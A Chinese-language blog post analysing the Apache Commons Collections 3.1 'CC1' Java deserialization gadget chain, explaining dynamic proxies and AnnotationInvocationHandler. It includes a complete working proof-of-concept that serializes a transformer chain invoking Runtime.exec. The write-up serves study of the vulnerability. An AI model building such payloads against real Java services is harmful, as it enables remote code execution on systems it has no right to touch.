# Apache Commons Collections1 反序列化漏洞分析


# 前言

最近继续学习cc链，cc1链子中和cc5有部分重合的，这里就重点记录一下新知识

# 环境搭建

创建maven项目，pox.xml修改为如下内容

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>ysoserialPayload</artifactId>
    <version>1.0-SNAPSHOT</version>
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <configuration>
                    <source>6</source>
                    <target>6</target>
                </configuration>
            </plugin>
        </plugins>
    </build>
    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

> 这里选用的commons-collections3.1版本，idea无法自动添加，需要手动添加
> jdk版本为：7u80  其中jdk需要小于8u71

这里先看一下ysoserial的gadget

```
/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
	Requires:
		commons-collections
 */
```

来看一下gadget，会发现他和cc5的区别在于，cc1使用了`AnnotationInvocationHandler.invoke()`去调用`LazyMap.get()`，而cc5是使用了`TiedMapEntry.toString()`去调用了`LazyMap.get()`，先前先分析了cc5，在这里就主要分析一下`AnnotationInvocationHandler.invoke()`是怎样调用`LazyMap.get()`的，在分析之前先来看一下动态代理

# 动态代理

先来看一下`AnnotationInvocationHandler`类的代码，其继承了`InvocationHandler`接口

```
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    ······
}
```

动态代理有一个主要函数为：Proxy.newProxyInstance()，其代码如下：

```
public static Object newProxyInstance(ClassLoader loader,
                                      Class<?>[] interfaces,
                                      InvocationHandler h)
    throws IllegalArgumentException
{
```

他有三个参数分别为
1. 接口类的ClassLoader
2. 接口或者接口数组
3. InvocationHandler实例

直接上代码，通过动态代理来举个例子：

```
public class Test {
    public static void main(String[] args) {

        class Demo implements InvocationHandler {
            protected Map map;

            public Demo(Map map){
                this.map = map;
            }

            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                System.out.println("我被调用了");
                // 判断使用get()方法时，返回值
                if (method.getName().compareTo("get") == 0){
                    return "Hello World！";
                }
                return method.invoke(this.map,args);
            }
        }

        // 实例InvocationHandler对象
        InvocationHandler invocationHandler = new Demo(new HashMap());
        // 传入要被代理的对象
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler);
        proxyMap.put("hello","world");
        String result = (String) proxyMap.get("hello");
        System.out.println(result);
    }
}
```

运行结果如下：

![1.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/e0fea803-9a14-ce9e-3eeb-079f6bb509c0.png)

此时会发现，`invoke()`被调用了两次，这是为什么呢？
来看下面这段代码

```
proxyMap.put("hello","world");
String result = (String) proxyMap.get("hello");
```
执行了两次`proxyMap`对象方法，而这个涉及到动态代理的一个重要知识点：**动态代理对象每执行一个方法时，都会被转发到实现InvocationHandler接口类的invoke方法**

接下来我们将`proxyMap.put("hello","world");`注释掉在执行一下，结果如下：

![2.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/32833581-25f4-5e8d-7dac-5a9c380b9e14.png)

明白了这里，接下来来分析cc1就很容易了

# 漏洞分析

接下来进入正题，来看一下`sun.reflect.annotation.AnnotationInvocationHandler#invoke`

![3.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/5c326955-f695-bcb9-f4af-bf8ea96ca3f1.png)

`invoke()`方法中会调用`get()`，而其中`memberValues`参数我们可控，也就是说我们通过动态代理构造一个`AnnotationInvocationHandler`实例并调用其某个方法就会触发`invoke()`从而触发到`LazyMap.get()`，接下来就要考虑怎么能够自动执行`invoke()`

![4.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8ae2c917-8fea-c278-41d8-e9a7fd8ea6f4.png)

接下来来看一下`sun.reflect.annotation.AnnotationInvocationHandler#readObject`

![5.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/95a367d1-ddb2-00be-dccf-772d1dc64730.png)

可以看到在`readObject()`中有这么一行代码`this.memberValues.entrySet()`，而在进行反序列化时会自动执行`readObject()`方法，也就是说我们要让反序列化时执行`AnnotationInvocationHandler`的`readObject`方法，从而执行`this.memberValues.entrySet()`在自动调用`invoke()`中的`this.memberValues.get()`

完整代码如下：

```
public class CommonsCollections1 {
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }
    public static Object unserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
        final Map testMap = new HashMap();
        Map evilMap = (Map) Proxy.newProxyInstance(
                testMap.getClass().getClassLoader(),
                testMap.getClass().getInterfaces(),
                secondInvocationHandler
        );
        final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
        byte[] serializeData=serialize(handler);
        unserialize(serializeData);
    }
}
```

可以看到其中有两个`AnnotationInvocationHandler`实例，第一个实例做成了一个动态代理`evilMap`，这时候我们执行`evilMap`的任意方法都会去自动调用`invoke()`中的`this.memberValues.get()`，而为了能够自动执行`evilMap`的任意方法，我们通过反射new了一个实例`handler`，此时我们对其进行序列化操作，其会自动执行`readObject()`中的`this.memberValues.entrySet()`从而触发`invoke()`造成命令执行

![6.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8ce14f2d-544d-c200-8ec1-895c1022e944.png)

# 参考链接
1. https://www.anquanke.com/post/id/230788
2. http://wjlshare.com/archives/1502

